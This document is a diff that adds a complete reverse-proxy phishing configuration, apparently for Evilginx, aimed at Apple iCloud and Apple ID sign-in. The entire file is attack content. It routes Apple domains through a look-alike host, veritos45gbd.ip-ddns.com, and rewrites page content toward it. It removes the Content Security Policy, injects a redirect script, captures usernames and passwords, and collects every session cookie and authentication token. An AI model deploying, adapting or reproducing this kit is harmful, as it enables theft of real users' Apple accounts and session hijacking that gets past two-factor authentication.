@@ -1,0 +1,103 @@
+author: '@gonxa'
+min_ver: '3.0.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'icloud.com', session: true, is_landing: true}
+  - {phish_sub: 'auth', orig_sub: 'auth', domain: 'apple.com', session: true, is_landing: false}
+  - {phish_sub: 'idmsa', orig_sub: 'idmsa', domain: 'apple.com', session: true, is_landing: false}
+  - {phish_sub: 'setup', orig_sub: 'setup', domain: 'icloud.com', session: true, is_landing: false}
+  - {phish_sub: 'feedbackws', orig_sub: 'feedbackws', domain: 'icloud.com', session: false, is_landing: false}
+  - {phish_sub: 'cdn', orig_sub: 'cdn', domain: 'apple-cloudkit.com', session: false, is_landing: false}
+  - {phish_sub: 'appleid', orig_sub: 'appleid', domain: 'apple.com', session: false, is_landing: false}
+  - {phish_sub: 'ckdatabasews', orig_sub: 'ckdatabasews', domain: 'icloud.com', session: false, is_landing: false}
+  - {phish_sub: 'static', orig_sub: 'static', domain: 'icloud.com', session: false, is_landing: false}
+  - {phish_sub: 'cdn', orig_sub: 'cdn.appleid', domain: 'cdn-apple.com', session: false, is_landing: false}
+  - {phish_sub: 'pXX-ckdatabase', orig_sub: 'p[0-9]+-ckdatabase', domain: 'icloud.com', session: false, is_landing: false, regex: true}
+
+sub_filters:
+  # Reemplazar dominios de iCloud y Apple solo en el contexto de URLs (no en rutas)
+  - {triggers_on: 'www.icloud.com', orig_sub: 'www', domain: 'icloud.com', search: '(https?://[^/]*?)icloud\.com', replace: '\1{hostname}', mimes: ['text/html', 'application/json'], regex: true}
+  - {triggers_on: 'www.icloud.com', orig_sub: 'idmsa', domain: 'apple.com', search: '(https?://[^/]*?)idmsa\.apple\.com', replace: '\1{hostname}', mimes: ['text/html', 'application/json'], regex: true}
+  - {triggers_on: 'www.icloud.com', orig_sub: 'auth', domain: 'apple.com', search: '(https?://[^/]*?)auth\.apple\.com', replace: '\1{hostname}', mimes: ['text/html', 'application/json'], regex: true}
+  - {triggers_on: 'www.icloud.com', orig_sub: 'www', domain: 'apple.com', search: '(https?://[^/]*?)apple\.com', replace: '\1{hostname}', mimes: ['text/html', 'application/json'], regex: true}
+  - {triggers_on: 'www.icloud.com', orig_sub: 'cdn', domain: 'apple-cloudkit.com', search: '(https?://[^/]*?)cdn\.apple-cloudkit\.com', replace: '\1{hostname}', mimes: ['text/html', 'application/json'], regex: true}
+  - {triggers_on: 'www.icloud.com', orig_sub: 'static', domain: 'icloud.com', search: '(https?://[^/]*?)static\.icloud\.com', replace: '\1{hostname}', mimes: ['text/html', 'application/json'], regex: true}
+  - {triggers_on: 'www.icloud.com', orig_sub: 'pXX-ckdatabase', domain: 'icloud.com', search: '(https?://[^/]*?)p[0-9]+\-ckdatabase\.icloud\.com', replace: '\1{hostname}', mimes: ['text/html', 'application/json'], regex: true}
+  - {triggers_on: 'www.icloud.com', orig_sub: 'setup', domain: 'icloud.com', search: 'setup\.icloud\.com', replace: 'setup.{hostname}', mimes: ['text/html', 'application/javascript', 'application/json']}
+  - {triggers_on: 'www.icloud.com', orig_sub: 'setup', domain: 'icloud.com', search: '"https://setup\.icloud\.com', replace: '"https://setup.{hostname}', mimes: ['text/html', 'application/javascript', 'application/json']}
+  - {triggers_on: 'www.icloud.com', orig_sub: 'setup', domain: 'icloud.com', search: '"setup.icloud.com"', replace: '"setup.{hostname}"', mimes: ['text/html', 'application/javascript', 'application/json']}
+  - {triggers_on: 'www.icloud.com', orig_sub: 'www', domain: 'icloud.com', search: '"icloud.com"', replace: '"veritos45gbd.ip-ddns.com"', mimes: ['text/html', 'application/javascript', 'application/json']}
+  - {triggers_on: 'www.icloud.com', orig_sub: 'setup', domain: 'icloud.com', search: '"https://setup\.veritos45gbd\.ip-ddns\.com/setup/ws/1/validate', replace: '"https://www.veritos45gbd.ip-ddns.com/setup/ws/1/validate', mimes: ['text/html', 'application/javascript', 'application/json']}
+  - {triggers_on: 'idmsa.apple.com', orig_sub: 'idmsa', domain: 'apple.com', search: 'idmsa\.veritos45gbd\.ip-ddns\.com', replace: 'idmsa.apple.com', mimes: ['text/html', 'application/javascript', 'application/json']}
+  - {triggers_on: 'idmsa.apple.com', orig_sub: 'idmsa', domain: 'apple.com', search: 'idmsa\.veritos45gbd\.ip-ddns\.com/appleauth/auth/signin/complete', replace: 'idmsa.apple.com/appleauth/auth/signin/complete', mimes: ['text/html', 'application/javascript', 'application/json']}
+  - {triggers_on: 'idmsa.apple.com', orig_sub: 'cdn.appleid', domain: 'cdn-apple.com', search: 'cdn\.appleid\.cdn-apple\.com', replace: 'cdn.veritos45gbd.ip-ddns.com', mimes: ['text/html', 'application/javascript', 'application/json', 'text/css']}
+  - {triggers_on: 'idmsa.apple.com', orig_sub: 'cdn.appleid', domain: 'cdn-apple.com', search: '"https://cdn\.appleid\.cdn-apple\.com', replace: '"https://cdn.veritos45gbd.ip-ddns.com', mimes: ['text/html', 'application/javascript', 'application/json', 'text/css']}
+  - {triggers_on: 'www.icloud.com', orig_sub: 'cdn.appleid', domain: 'cdn-apple.com', search: 'cdn\.appleid\.cdn-apple\.com', replace: 'cdn.veritos45gbd.ip-ddns.com', mimes: ['text/html', 'application/javascript', 'application/json', 'text/css']}
+  - {triggers_on: 'www.icloud.com', orig_sub: 'cdn.appleid', domain: 'cdn-apple.com', search: '"https://cdn\.appleid\.cdn-apple\.com', replace: '"https://cdn.veritos45gbd.ip-ddns.com', mimes: ['text/html', 'application/javascript', 'application/json', 'text/css']}
+  - {triggers_on: 'www.icloud.com', orig_sub: 'www', domain: 'apple.com', search: 'http://www\.apple\.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/javascript', 'application/json']}
+  - {triggers_on: 'www.icloud.com', orig_sub: 'www', domain: 'apple.com', search: 'http://www\.apple\.com/filenotfound', replace: 'https://{hostname}/filenotfound', mimes: ['text/html', 'application/javascript', 'application/json']}
+  - {triggers_on: 'idmsa.apple.com', orig_sub: 'idmsa', domain: 'apple.com', search: 'http://www\.apple\.com/filenotfound', replace: 'https://{hostname}/filenotfound', mimes: ['text/html', 'application/javascript', 'application/json']}
+  - {triggers_on: 'www.icloud.com', orig_sub: 'www', domain: 'apple.com', search: 'www\.apple\.com', replace: '{hostname}', mimes: ['text/html', 'application/javascript', 'application/json']}
+  - {triggers_on: 'idmsa.apple.com', orig_sub: 'idmsa', domain: 'apple.com', search: '/s/22a2fa320fc235261c7d551419ccea23615b28b6338cd5b171a7b40190ad9645', replace: 'https://{hostname}/s/22a2fa320fc235261c7d551419ccea23615b28b6338cd5b171a7b40190ad9645', mimes: ['application/javascript']}
+  # Inyectar x-apple-session-token en los encabezados de la solicitud
+  - {triggers_on: 'idmsa.apple.com', orig_sub: 'idmsa', domain: 'apple.com', search: 'fetch\("/appleauth/auth/signin/complete"', replace: 'fetch("/appleauth/auth/signin/complete", { headers: { "X-Apple-Session-Token": "{x-apple-session-token}" }', mimes: ['application/javascript'], regex: true}
+  # Mantener trustTokens vacío
+  - {triggers_on: 'idmsa.apple.com', orig_sub: 'idmsa', domain: 'apple.com', search: 'trustTokens:\s*\[\]', replace: 'trustTokens: []', mimes: ['application/javascript'], regex: true}
+  # Forzar la redirección a /auth buscando el mensaje en español
+  - {triggers_on: 'idmsa.apple.com', orig_sub: 'idmsa', domain: 'apple.com', search: '"No se puede verificar tu identidad"', replace: 'window.location.href="https://idmsa.veritos45gbd.ip-ddns.com/auth";', mimes: ['application/javascript'], regex: true}
+  # Añadir encabezados de seguridad
+  - {triggers_on: 'idmsa.apple.com', orig_sub: 'idmsa', domain: 'apple.com', search: '</head>', replace: '<meta http-equiv="Strict-Transport-Security" content="max-age=31536000; includeSubDomains; preload"><meta http-equiv="X-Content-Type-Options" content="nosniff"><meta http-equiv="X-Frame-Options" content="DENY"><meta http-equiv="X-XSS-Protection" content="1; mode=block"></head>', mimes: ['text/html']}
+  # Asegurar que las URLs absolutas apunten al proxy
+  - {triggers_on: 'www.icloud.com', orig_sub: 'www', domain: 'icloud.com', search: 'https://www.icloud.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/javascript', 'application/json']}
+  - {triggers_on: 'www.icloud.com', orig_sub: 'cdn', domain: 'apple-cloudkit.com', search: 'https://cdn.apple-cloudkit.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/javascript', 'application/json']}
+  # Proteger la ruta /system/icloud.com/ para que no se modifique
+  - {triggers_on: 'www.icloud.com', orig_sub: 'www', domain: 'icloud.com', search: '/system/icloud\.com/', replace: '/system/icloud.com/', mimes: ['text/html', 'application/javascript', 'application/json'], regex: true}
+  # Manejar rutas específicas como /s/*
+  - {triggers_on: 'www.icloud.com', orig_sub: 'www', domain: 'icloud.com', search: '"/s/', replace: '"https://{hostname}/s/', mimes: ['text/html', 'application/javascript', 'application/json']}
+  - {triggers_on: 'www.icloud.com', orig_sub: 'www', domain: 'icloud.com', search: '"https://www.icloud.com/s/', replace: '"https://{hostname}/s/', mimes: ['text/html', 'application/javascript', 'application/json']}
+  - {triggers_on: 'www.icloud.com', orig_sub: 'static', domain: 'icloud.com', search: '"https://static.icloud.com/s/', replace: '"https://{hostname}/s/', mimes: ['text/html', 'application/javascript', 'application/json']}
+  # Manejar referencias a main.js y main.css
+  - {triggers_on: 'www.icloud.com', orig_sub: 'www', domain: 'icloud.com', search: '"/system/icloud\.com/[^"]*/main\.js"', replace: '"https://{hostname}/system/icloud.com/2512Hotfix21/es-mx/main.js"', mimes: ['text/html', 'application/javascript', 'application/json'], regex: true}
+  - {triggers_on: 'www.icloud.com', orig_sub: 'www', domain: 'icloud.com', search: '"/system/icloud\.com/[^"]*/main\.css"', replace: '"https://{hostname}/system/icloud.com/2512Hotfix21/es-mx/main.css"', mimes: ['text/html', 'application/javascript', 'application/json'], regex: true}
+  - {triggers_on: 'www.icloud.com', orig_sub: 'static', domain: 'icloud.com', search: '"https://static.icloud.com/main.js', replace: '"https://{hostname}/main.js', mimes: ['text/html', 'application/javascript', 'application/json']}
+  - {triggers_on: 'www.icloud.com', orig_sub: 'static', domain: 'icloud.com', search: '"https://static.icloud.com/main.css', replace: '"https://{hostname}/main.css', mimes: ['text/html', 'application/javascript', 'application/json']}
+  # Manejar redirecciones dinámicas y referencias en JSON
+  - {triggers_on: 'www.icloud.com', orig_sub: 'www', domain: 'icloud.com', search: '"location":"https://www.icloud.com.*?"', replace: '"location":"https://{hostname}"', mimes: ['application/json']}
+  - {triggers_on: 'www.icloud.com', orig_sub: 'www', domain: 'icloud.com', search: '"url":"https://www.icloud.com.*?"', replace: '"url":"https://{hostname}"', mimes: ['application/json']}
+  # Modificar la CSP para permitir scripts inline
+  - {triggers_on: 'www.icloud.com', orig_sub: 'www', domain: 'icloud.com', search: "script-src blob: 'self' *.www.veritos45gbd.ip-ddns.com *.apple-cloudkit.com *.cdn-www.veritos45gbd.ip-ddns.com", replace: "script-src blob: 'self' *.www.veritos45gbd.ip-ddns.com *.apple-cloudkit.com *.cdn-www.veritos45gbd.ip-ddns.com 'unsafe-inline'", mimes: ['text/html']}
+  # Alternativa: Eliminar la CSP por completo
+  - {triggers_on: 'www.icloud.com', orig_sub: 'www', domain: 'icloud.com', search: "<meta http-equiv=\"Content-Security-Policy\".*?>", replace: "", mimes: ['text/html'], regex: true}
+  # Actualizar el meta tag obsoleto
+  - {triggers_on: 'www.icloud.com', orig_sub: 'www', domain: 'icloud.com', search: '<meta name="apple-mobile-web-app-capable" content="yes">', replace: '<meta name="mobile-web-app-capable" content="yes">', mimes: ['text/html']}
+
+auth_tokens:
+  - domain: 'idmsa.apple.com'
+    keys: ['sessionid', 'scnt', 'X-Apple-ID-Session-Id', 'X-Apple-Session-Token', 'X-Apple-I-FD-Client-Info', 'X-Apple-Widget-Key', '.*,regexp', '__Host-sessionid', '__Secure-sessionid']
+  - domain: 'www.icloud.com'
+    keys: ['X-APPLE-WEBAUTH-USER', 'X-APPLE-WEBAUTH-TOKEN', 'icloud_session', '.*,regexp']
+  - domain: 'apple.com'
+    keys: ['SID', '.*,regexp']
+  - domain: 'setup.icloud.com'
+    keys: ['.*,regexp']
+  - domain: 'cdn.apple-cloudkit.com'
+    keys: ['.*,regexp']
+
+credentials:
+  username:
+    key: 'accountName'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'www.icloud.com'
+  path: '/'
+
+auth_urls:
+  - '/system/cloudos'
+  - '/dashboard'
+
+redirect_url: 'https://www.icloud.com'
